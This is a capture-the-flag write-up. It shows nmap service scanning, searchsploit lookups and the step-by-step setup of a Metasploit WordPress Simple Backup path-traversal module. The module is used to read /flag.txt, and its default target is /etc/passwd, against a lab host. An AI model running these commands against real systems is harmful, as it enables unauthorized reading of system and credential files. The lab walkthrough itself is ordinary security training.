# Step 1

Find services running on server with
''' bash

nmap -sV -s <target-ip>'
'''

Output:
```
PORT      STATE    SERVICE      VERSION
19/tcp    filtered chargen
22/tcp    open     ssh          OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
25/tcp    filtered smtp
53/tcp    open     domain       dnsmasq 2.84
111/tcp   open     rpcbind      2-4 (RPC #100000)
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
49157/tcp open     http         nginx 1.19.2
55555/tcp open     http         Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 # Step 2

Search for exploits of the services. I tried searching for the services exaclty as they are listed in the nmap output to no avail. I did get some results from the attempt below 

``` bash
searchsploit Apache 2.4.41 
```

Output:

```

------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution         | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner       | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                     | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow    | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow  | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow  | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal     | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                       | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                     | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)               | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Uplo | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Uplo | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)            | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code  | linux/remote/34.pl
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

From visiting the webpage I found that the site was using Wordpress 2.7.10.

``` bash

Searchsploit Wordpress 2.7.10

```

Output:

```


------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                 | php/webapps/51042.txt
WordPress Core < 2.8.5 - Unrestricted Arbitrary File Upload / Arbitrary | php/webapps/10089.txt
WordPress Core < 4.0.1 - Denial of Service                              | php/dos/35414.txt
WordPress Core < 4.7.1 - Username Enumeration                           | php/webapps/41497.php
WordPress Core < 4.7.4 - Unauthorized Password Reset                    | linux/webapps/41963.txt
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion        | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                 | php/dos/47800.py
WordPress File Upload Plugin < 4.23.3 - Stored XSS                      | php/webapps/51899.txt
WordPress Plugin Add From Server < 3.3.2 - Cross-Site Request Forgery ( | php/webapps/40220.txt
WordPress Plugin Ads Pro < 3.4 - Cross-Site Scripting / SQL Injection   | php/webapps/42380.txt
WordPress Plugin Ajax Load More < 2.8.2 - Arbitrary File Upload         | php/webapps/38484.rb
WordPress Plugin Background Takeover < 4.1.4 - Directory Traversal      | php/webapps/44417.txt
Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote | php/webapps/51826.py
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metaspl | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities     | php/webapps/39553.txt
WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities    | php/webapps/38176.txt
WordPress Plugin Google Map < 4.0.4 - SQL Injection                     | php/webapps/44883.txt
WordPress Plugin Google Maps via Store Locator 2.7.1 < 3.0.1 - Multiple | php/webapps/18989.php
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection               | php/webapps/44943.txt
WordPress Plugin NEX-Forms < 3.0 - SQL Injection                        | php/webapps/36800.txt
WordPress Plugin Pie Register < 3.0.9 - Blind SQL Injection             | php/webapps/44867.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection             | php/webapps/48918.sh
WordPress Plugin Service Finder Booking < 3.2 - Local File Disclosure   | php/webapps/43475.txt
WordPress Plugin Smart Google Code Inserter < 3.5 - Authentication Bypa | php/webapps/43420.txt
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution         | php/webapps/46794.py
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation         | php/webapps/44595.rb
WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass             | php/webapps/43117.txt
WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalat | php/webapps/46083.txt
WordPress Plugin WP-Testimonials < 3.4.1 - SQL Injection                | php/webapps/42166.txt
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```




These didn't lead to anything, so I fire up the metasploit console and search directly for the plugin shown on the webpage

``` bash

msf6 > search exploit Simple backup plugin
```

Output:


```

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read  .                normal  No     WordPress Simple Backup File Read Vulnerability

```


# Step 3

Configure exploit

See what needs to be set 
``` bash
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options
```

Output:

```
Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.htm
                                         l
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

```

Setting depth:

From visiting the site, I can see the full url is 'http://83.136.253.249:38726/index.php/2021/02/11/hello-world/'. There are five segements seperating the pwd to the root, so the depth is five 

``` bash
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set DEPTH 5
```


Setting file path:

The descrition of the challenge is to find /flag.txt, so I'll set that as the FILEPATH

``` bash
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FIlEPATH /flag.txt
```

Setting target host (RHOST):

``` bash 
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOST 83.136.253.249
```

Setting target port (RPORT):

``` bash

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORT 38726

```



Setting Target URI (URI to wordpress application)
``` bash
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set TARGETURI http://83.136.253.249:38726/index.php/2021/02/11/hello-world/

```

Setting thread count 

``` bash 

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set THREADS 1

```

# Step 4  

Run the exploit

``` bash

msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > exploit

```

Output:




```

[+] File saved in: /home/davidingraham/.msf4/loot/20240805115804_default_83.136.253.249_simplebackup.tra_796531.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# Step 4

Navigate to previously mentioned directory and cat file for the flag





















































